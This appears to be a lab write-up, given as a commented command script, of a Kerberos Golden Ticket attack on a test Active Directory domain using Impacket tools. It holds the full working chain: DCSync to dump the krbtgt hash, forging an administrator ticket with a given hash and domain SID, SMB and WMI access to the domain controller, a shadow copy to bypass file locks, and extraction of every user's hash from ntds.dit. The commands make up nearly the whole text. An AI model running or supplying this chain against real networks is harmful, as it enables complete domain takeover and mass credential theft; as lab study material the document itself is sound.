#This attack demonstrates how an attacker can gain persistence and full domain access by forging a Kerberos Ticket Granting Ticket (TGT)
#using the krbtgt account hash retrieved via DCSync. All commands are executed from a Kali Linux machine using Impacket tools.

# 1. DCSync: Extract the krbtgt NTLM Hash
# We used secretsdump.py with a privileged account (paul) to simulate domain controller replication and retrieve password hashes.

secretsdump.py 'OFFENSIVELOCAL/paul:Password123!'@192.168.56.2
# The output contains the NTLM hash of the krbtgt account

# 2. Get Domain SID
# We enumerated the Domain SID using lookupsid.py:

lookupsid.py offensive.local/administrator@192.168.56.2

# Before launching the attack, we edited the local /etc/hosts file to ensure proper hostname resolution in the absence of DNS.
# This step was necessary to allow Impacket tools to resolve the Domain Controller’s FQDNs correctly.

sudo nano /etc/hosts
# and then append this:
192.168.56.2  domainc.offensive.local domainc.offensive offensive.local domainc


# 3. Forge the Golden Ticket
# We generated a TGT using ticketer.py with the krbtgt hash and domain SID:

ticketer.py -nthash e40c9c4047359127a152a9b0c346762f -domain-sid S-1-5-21-2006739485-2589745431-2827281819 -domain offensive.local administrator

# 4. Inject Ticket into Current Session
export KRB5CCNAME=administrator.ccache
klist

# We verified the forged ticket was active

# 5. Validate Access Over SMB
# Using the injected ticket, we authenticated with SMB:

smbclient.py -k offensive.local/administrator@domainc.offensive.local -no-pass

#After listing shares and mounting C$, we had access as administrator.(this is done in the shell)
shares
use C$

# 6. Initial Attempt to Dump ntds.dit (Failed)
# We navigated to the NTDS folder:

cd Windows\NTDS
get ntds.dit

# This failed: [-] SMB SessionError: code: 0xc0000043 - STATUS_SHARING_VIOLATION

# 7. Create Volume Shadow Copy to Bypass Lock
# Using wmiexec.py, we created a shadow copy of the C: drive:

KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass offensive.local/administrator@domainc.offensive.local

# In the remote shell:

vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM

# 8. Retrieve Shadow Files Over SMB
smbclient.py -k offensive.local/administrator@domainc.offensive.local -no-pass

# In the SMB shell:

use C$
cd Windows\Temp
get ntds.dit
get SYSTEM

# 9. Extract Credentials from ntds.dit
secretsdump.py -ntds ntds.dit -system SYSTEM -outputfile domain_dump local
#This dumped all user password hashes and Kerberos keys from the domain controller.

